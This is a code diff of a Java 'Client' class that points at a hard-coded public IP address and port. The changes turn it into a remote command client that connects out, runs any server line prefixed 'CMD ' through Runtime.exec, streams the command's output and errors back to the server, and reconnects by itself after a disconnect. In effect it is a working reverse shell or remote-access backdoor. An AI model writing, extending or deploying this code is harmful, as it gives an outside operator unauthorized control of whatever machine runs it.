@@ -4,8 +4,12 @@ import java.io.*;
 import java.net.Socket;
 
 public class Client {
-    private static String HOST = "127.0.0.1";
+    private static String HOST = "141.219.247.5";
     private static int PORT = 22122;
+    private PrintWriter out;
+    private BufferedReader in;
+    private Socket socket;
+    private String comm;
 
     public static String getHOST() {
         return HOST;
@@ -24,31 +28,60 @@ public class Client {
     }
 
     public static void main(String[] args) {
-        Client client = new Client();
-        client.loadServerSettings();
-        try (
-                Socket socket = new Socket(getHOST(), getPORT());
-                PrintWriter out =
-                        new PrintWriter(socket.getOutputStream(), true);
-                BufferedReader in =
-                        new BufferedReader(
-                                new InputStreamReader(socket.getInputStream()))
-        ) {
-            while (true) {
-                System.out.println("" + in.readLine());
-                out.println(System.getProperty("OS:" +"os.name"));
-                if (in.readLine().contains("e")){
-                    Process p = Runtime.getRuntime().exec("notepad.exe");
+        new Client().connect();
+    }
+
+    private void connect() {
+//        loadServerSettings();
+        try {
+            socket = new Socket(getHOST(), getPORT());
+            out = new PrintWriter(socket.getOutputStream());
+            out.flush();
+            in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
+            System.out.println("Client started: " + getHOST() + ":" + getPORT());
+            do {
+                comm = in.readLine();
+                if (comm.contains("CMD ")) {
+                    exec(comm.replace("CMD ", ""));
                 }
-            }
-        } catch (IOException e) {
-            e.printStackTrace();
+                if(comm.equals("forciblyclose")){
+                    out.println("forciblyclose");
+                }
+            } while (!comm.equals("forciblyclose"));
+
+        } catch (IOException e1) {
+            System.out.println("Disconnected... retrying.");
+            connect();
         }
     }
 
-    private void exec(String command) throws IOException {
-        Process p = Runtime.getRuntime().exec(command);
+    private void communicate(String msg) {
+        out.println(msg);
+        out.flush();
     }
+
+    private void exec(String command) throws IOException {
+        if (!command.equals("")) {
+            System.out.println(command);
+            Process p = Runtime.getRuntime().exec(command);
+            BufferedReader stdInput = new BufferedReader(new
+                    InputStreamReader(p.getInputStream()));
+            BufferedReader stdError = new BufferedReader(new
+                    InputStreamReader(p.getErrorStream()));
+            String s;
+            System.out.println("HA");
+            while ((s = stdInput.readLine()) != null) {
+                communicate(s);
+                System.out.println(s);
+            }
+            while ((s = stdError.readLine()) != null) {
+                communicate(s);
+                System.out.println(s);
+            }
+            communicate("end");
+        }
+    }
+
     private void loadServerSettings() {
         try (BufferedReader reader = new BufferedReader(new FileReader(".mauscs"))
         ) {
